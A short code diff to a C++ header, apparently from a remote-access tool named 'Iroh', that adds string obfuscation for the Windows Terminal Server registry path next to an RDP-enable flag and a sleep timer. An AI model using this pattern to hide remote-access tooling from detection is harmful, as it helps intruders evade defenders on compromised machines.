@@ -3,8 +3,12 @@
 
 #include <Windows.h>
 
+#include "../Utilities/obfuscate.h"
+
 #define DEFAULT_ENABLERDP FALSE
 #define DEFAULT_SLEEPTIMER 15000
+
+#define REGISTRY_KEY (wchar_t *)(char *)AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\Terminal Server")
 
 namespace Iroh {
 
